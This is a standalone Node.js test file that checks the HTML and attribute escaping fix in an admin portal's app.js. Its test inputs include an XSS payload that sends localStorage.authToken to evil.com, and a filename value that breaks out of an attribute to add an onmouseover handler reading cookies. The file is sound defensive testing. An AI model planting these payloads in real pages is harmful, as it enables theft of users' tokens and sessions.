// Standalone test for the escapeHtml()/escapeAttr() fix in ops-admin-portal/app.js.
// Run with: node test-escaping.mjs
// One-time setup (only needed if jsdom isn't already installed somewhere on this machine):
//   npm install jsdom --no-save
//
// This does NOT touch your server or database — it loads the real functions out
// of app.js and checks their output directly, the same way a unit test would in
// a project that had a test framework wired up (this one doesn't yet).

import { JSDOM } from "jsdom";
import { readFileSync } from "fs";

const dom = new JSDOM("<!doctype html><html><body></body></html>");
global.document = dom.window.document;

// Pull the two functions out of the real app.js source rather than
// hand-copying them, so this test breaks if someone edits app.js and
// accidentally reintroduces the bug or changes the escaping behavior.
const source = readFileSync("./ops-admin-portal/app.js", "utf8");
const escapeHtmlMatch = source.match(/function escapeHtml\([\s\S]*?\r?\n}/);
const escapeAttrMatch = source.match(/function escapeAttr\([\s\S]*?\r?\n}/);
const fnSource = escapeHtmlMatch && escapeAttrMatch
  ? [escapeHtmlMatch[0], escapeAttrMatch[0]]
  : null;
if (!fnSource) {
  console.error("Could not find escapeHtml/escapeAttr in app.js — did the function names change?");
  process.exit(1);
}
const defineFns = new Function(
  "root",
  `${fnSource.join("\n\n")}\nroot.escapeHtml = escapeHtml; root.escapeAttr = escapeAttr;`
);
defineFns(globalThis);

let failures = 0;
function check(name, actual, expected) {
  const pass = actual === expected;
  console.log(`${pass ? "PASS" : "FAIL"} — ${name}`);
  if (!pass) {
    console.log(`  expected: ${JSON.stringify(expected)}`);
    console.log(`  actual:   ${JSON.stringify(actual)}`);
    failures++;
  }
}

// The actual payload style that would have executed before the fix.
const scriptPayload = `<img src=x onerror="fetch('https://evil.com/steal?t='+localStorage.authToken)">`;
check(
  "escapeHtml neutralizes a script-bearing label",
  escapeHtml(scriptPayload),
  "&lt;img src=x onerror=\"fetch('https://evil.com/steal?t='+localStorage.authToken)\"&gt;"
);

// A plain, harmless label should render unchanged.
check(
  "escapeHtml leaves an ordinary label alone",
  escapeHtml("Passport – Front Page"),
  "Passport – Front Page"
);

// Attribute-context payload: a filename containing a quote that would
// otherwise break out of data-doc-name="...".
const attrPayload = `resume.pdf" onmouseover="alert(document.cookie)`;
const escapedAttr = escapeAttr(attrPayload);
check(
  "escapeAttr removes the unescaped double-quote that breaks out of an attribute",
  escapedAttr.includes('"'),
  false
);
check(
  "escapeAttr still preserves the readable filename text",
  escapedAttr.includes("resume.pdf"),
  true
);

// Confirm rebuilding it into the actual attribute template used in app.js
// can no longer produce a second real attribute.
const rebuilt = `<button data-doc-name="${escapedAttr}">Download</button>`;
check(
  "rebuilt attribute HTML contains no unescaped quote",
  (rebuilt.match(/"/g) || []).length,
  2 // only the two quotes that legitimately open/close data-doc-name
);

console.log(failures === 0 ? "\nAll checks passed." : `\n${failures} check(s) FAILED.`);
process.exit(failures === 0 ? 0 : 1);
